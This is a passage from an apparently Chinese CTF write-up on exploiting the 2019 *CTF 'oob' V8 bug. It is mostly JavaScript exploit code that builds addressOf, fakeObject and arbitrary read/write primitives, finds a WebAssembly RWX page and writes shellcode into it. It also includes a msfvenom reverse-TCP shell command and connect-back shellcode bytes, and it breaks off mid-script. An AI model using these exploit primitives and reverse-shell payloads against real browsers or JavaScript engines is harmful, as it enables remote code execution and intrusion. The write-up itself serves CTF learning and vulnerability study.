class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>我们可以通过<code>Function_Object--&gt;shared_info--&gt;data--&gt;instance</code>，通过<code>instance+0x88</code>既可以找到<code>wasm</code>的可执行内存页的地址</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805164011.png" alt="图片无法显示，请联系作者" title=" "><p>寻找上面的地址泄露逻辑，可执行内存地址的泄露代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="title function_">hex</span>(f_addr));</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">read64</span>(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="title function_">hex</span>(rwx_page_addr));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>可以成功的泄露可执行内存页的地址</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805165843.png" alt="图片无法显示，请联系作者" title=" "><p>因此后续我们将<code>shellcode</code>写入这个地址就可以在调用<code>wasm</code>函数接口的时候触发我们的<code>shellcode</code>了。<code>shellcode</code>可以在<code>exploit-db</code>中寻找</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /bin/sh for linux x64</span></span><br><span class="line"><span class="comment"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><p>最终可以<code>getshell</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805170737.png" alt="图片无法显示，请联系作者" title=" "><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>可以用<code>msfvenom</code>来生成反弹<code>shell</code>的<code>shellcode</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3389 -f python -o ~/Desktop/shellcode.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shell2x64</span>(<span class="params">shellcode</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">        length = <span class="built_in">len</span>(shellcode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = <span class="number">8</span> * (<span class="built_in">len</span>(shellcode) // <span class="number">8</span> + <span class="number">1</span>)</span><br><span class="line">    shellcode = shellcode.ljust(length, <span class="string">b&quot;\x90&quot;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    de_shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= length - <span class="number">8</span>:</span><br><span class="line">        de_shellcode += <span class="built_in">hex</span>(u64(shellcode[i:i + <span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">if</span> i != length - <span class="number">8</span>:</span><br><span class="line">            de_shellcode += <span class="string">&quot;n, &quot;</span></span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(de_shellcode)</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x97\x48\xb9\x02\x00\x0d\x3d\x7f\x00\x00\x01\x51\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">shell2x64(buf)</span><br></pre></td></tr></table></figure><p>最终监听<code>3389</code>端口<code>getshell</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805173733.png" alt="图片无法显示，请联系作者" title=" "><p>最终脚本如下`</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露指定对象的地址</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj_to_leak</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把某个地址转换为对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr_to_fake</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_addr = <span class="title function_">addressOf</span>(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_arr_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//randomRead</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = <span class="title function_">f2i</span>(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span></span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeDataview</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">    <span class="title function_">write64</span>(buf_backing_store_addr,addr);</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,data,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="title function_">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="title function_">hex</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var start_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">var leak_d8_addr = 0n;</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    start_addr -= 0x8n;</span></span><br><span class="line"><span class="comment">    leak_d8_addr = read64(start_addr);</span></span><br><span class="line"><span class="comment">    if((leak_d8_addr &amp; 0xfffn) == 0xe40n &amp;&amp; read64(leak_d8_addr) == 0x56415741e5894855n)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        console.log(&quot;[*] Success find leak_d8_addr: 0x&quot; + hex(leak_d8_addr));</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var code_addr = read64(addressOf(a.constructor) + 0x30n);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find addressOf(a.constructor): 0x&quot; + hex(addressOf(a.constructor)));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find code addr: 0x&quot; + hex(code_addr));</span></span><br><span class="line"><span class="comment">var leak_d8_addr = read64(code_addr + 0x41n);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc leak_d8_addr: 0x&quot; + hex(leak_d8_addr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">console.log(&quot;[*] Done.&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//var d8_base_addr = leak_d8_addr - 0x997e40n;</span></span><br><span class="line"><span class="comment">var d8_base_addr = leak_d8_addr - 0xad54e0n;</span></span><br><span class="line"><span class="comment">var d8_got_libc_start_main_addr = d8_base_addr + 0xd98730n;</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] d8_got_libc_start_main_addr: 0x&quot; + hex(d8_got_libc_start_main_addr));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span></span><br><span class="line"><span class="comment">var libc_base_addr = libc_start_main_addr - 0x26fc0n;</span></span><br><span class="line"><span class="comment">var libc_system_addr = libc_base_addr + 0x55410n;</span></span><br><span class="line"><span class="comment">var libc_free_hook_addr = libc_base_addr + 0x1eeb28n;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc addr: 0x&quot; + hex(libc_base_addr));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc system address: 0x&quot; + hex(libc_system_addr));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc libc_free_hook_addr: 0x&quot; + hex(libc_free_hook_addr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">writeDataview(libc_free_hook_addr, libc_system_addr);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] Write ok.&quot;);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function get_shell()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    let get_shell_buffer = new ArrayBuffer(0x1000);</span></span><br><span class="line"><span class="comment">    let get_shell_dataview = new DataView(get_shell_buffer);</span></span><br><span class="line"><span class="comment">    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00 </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">get_shell();*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = 